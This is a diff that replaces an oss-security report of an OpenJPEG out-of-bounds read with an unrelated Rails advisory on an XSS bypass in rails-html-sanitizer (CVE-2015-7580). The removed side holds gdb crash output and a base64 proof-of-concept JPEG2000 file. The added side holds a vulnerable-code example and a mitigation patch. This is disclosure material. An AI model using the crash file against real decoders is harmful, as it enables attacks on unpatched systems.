@@ -1,83 +1,77 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/03/14/14
-Message-ID: <1F2D4DA31CA62740BFF46830A0E6A4F7064F698E@EXMBX-TJ002.tencent.com>
-Date: Mon, 14 Mar 2016 06:51:58 +0000
-From: winsonliu(刘科) <winsonliu@...cent.com>
-To: oss-security <oss-security@...ts.openwall.com>
-Subject: CVE request - OpenJPEG : Out-Of-Bounds Read in sycc422_to_rgb function
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/01/25/15
+Message-ID: <20160125193845.GH14069@TC.local>
+Date: Mon, 25 Jan 2016 11:38:45 -0800
+From: Aaron Patterson <tenderlove@...y-lang.org>
+To: security@...e.de, rubyonrails-security@...glegroups.com, oss-security@...ts.openwall.com, ruby-security-ann@...glegroups.com
+Subject: [CVE-2015-7580] Possible XSS vulnerability in rails-html-sanitizer
 Content-Type: text/plain; charset=utf-8
 
-Hi all,
+Possible XSS vulnerability in rails-html-sanitizer
 
-I find a vulnerability of OpenJPEG. The specific flaw exists within the sycc422_to_rgb function. A specially crafted JPEG2000 image file can force Out-Of-Bounds Read occurring in OpenJPEG. This issue can be reproduced in the latest version of OpenJPEG (https://github.com/uclouvain/openjpeg 2016.03.14).
+There is a possible XSS vulnerability in the white list sanitizer in the
+rails-html-sanitizer gem. This vulnerability has been assigned the CVE
+identifier CVE-2015-7580.
 
-The detailed information about this issue can be described as follows.
----------------------------------
-winson@...ntu:~/Desktop/repo/openjpeg/bin$ gdb opj_decompress -q
-Reading symbols from opj_decompress...(no debugging symbols found)...done.
+Versions Affected:  All.
+Not affected:       None.
+Fixed Versions:     v1.0.3
 
-(gdb) r -o image.pgm -i oob_sycc422_to_rgb.j2k
-Starting program: /home/winson/Desktop/repo/openjpeg/bin/opj_decompress -o image.pgm -i oob_sycc422_to_rgb.j2k
+Impact
+------
+Carefully crafted strings can cause user input to bypass the sanitization in
+the white list sanitizer which will can lead to an XSS attack.
 
-[INFO] Start to read j2k main header (0).
-[INFO] Main header has been correctly decoded.
-[INFO] No decoded area parameters, set the decoded area to the whole image
-[INFO] Header of tile 1 / 97 has been read.
-[INFO] Tile 1/97 has been decoded.
-[INFO] Image data has been updated with tile 1.
+Vulnerable code will look something like this:
 
-Program received signal SIGSEGV, Segmentation fault.
-0x08058a42 in sycc422_to_rgb ()
+  <%= sanitize user_input, tags: %w(em) %>
 
-(gdb) bt
-#0  0x08058a42 in sycc422_to_rgb ()
-#1  0x08059227 in color_sycc_to_rgb ()
-#2  0x0804c49f in main ()
+All users running an affected release should either upgrade or use one of the
+workarounds immediately.
 
-(gdb) x /i $eip
-=> 0x8058a42 <sycc422_to_rgb+430>: mov    (%eax),%ecx
+Releases
+--------
+The FIXED releases are available at the normal locations.
 
-(gdb) i r
-eax            0x815c000 135643136
-ecx            0x0 0
-edx            0x0 0
-ebx            0xb7d7ddcc -1210589748
-esp            0xbfff9ed0 0xbfff9ed0
-ebp            0xbfff9f38 0xbfff9f38
-esi            0x0 0
-edi            0x0 0
-eip            0x8058a42 0x8058a42 <sycc422_to_rgb+430>
-eflags         0x10297 [ CF PF AF SF IF RF ]
-cs             0x73 115
-ss             0x7b 123
-ds             0x7b 123
-es             0x7b 123
-fs             0x0 0
-gs             0x33 51
+Workarounds
+-----------
+Putting the following monkey patch in an initializer can help to mitigate the
+issue:
 
-(gdb) x /40xb $eax-0x20
-0x815bfe0: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
-0x815bfe8: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
-0x815bff0: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
-0x815bff8: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
-0x815c000: Cannot access memory at address 0x815c000
+```
+class Rails::Html::PermitScrubber
+  alias :old_scrub :scrub
+  alias :old_skip_node? :skip_node?
 
+  def scrub(node)
+    if node.cdata?
+      text = node.document.create_text_node node.text
+      node.replace text
+      return CONTINUE
+    end
+    old_scrub node
+  end
 
-The attachment is the proof-of-concept file.
-Alternatively, you can decode the following string using base64 and save the decoded content to a .j2k file.
----------------------------------
-/0//UQAvAAAAAACAAAAwgAAAAHsAAAAAAAAAgAAAAIAAAAAAAAAAAAADBwEBBwIBBwIB/1IAEgEA
-AAMABQMDAAEzRFVmd3f/XAATQEBISFBISFBISFBISFBISFD/ZABCAAFDcmVhdGVkIGJ5IE9QSlZp
-ZXdlciBXaW4zMiAtIE9wZW5KUEVHICB2ZXJzaW9uIDEuMi4wIHdpdGggSlBXTP+QAAoAAAAAAKYA
-Af9TAA8BAQUDAwABM0RVZnd3/10AFAFAQEhIUEhIUEhIUEhIUEhIUP9TAA8CAQUDAwABM0RVZnd3
-/10AFAJAQEhIUEhIUEhIUEhIUEhIUP+Tz6QgEVBUr8+YKBFQVKMDz4woEVBUoOKAgICAgICAgICA
-gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgID/2Q==
+  def skip_node?(node); node.text?; end
+end
+```
 
+Patches
+-------
+To aid users who aren't able to upgrade immediately we have provided patches for
+the two supported release series. They are in git-am format and consist of a
+single changeset.
 
-CREDIT:
-This vulnerability was discovered by Ke Liu of Tencent's Xuanwu LAB.
+* 1-0-whitelist_sanitizer_xss.patch - Patch for 1.0 series
 
+Credits
+-------
+Thanks to Arnaud Germis, Nate Clark, and John Colvin for reporting this issue.
 
-Content of type "text/html" skipped
+-- 
+Aaron Patterson
+http://tenderlovemaking.com/
 
-Download attachment "oob_sycc422_to_rgb.j2k" of type "application/octet-stream" (328 bytes)
+View attachment "1-0-whitelist_sanitizer_xss.patch" of type "text/plain" (2140 bytes)
+
+Content of type "application/pgp-signature" skipped
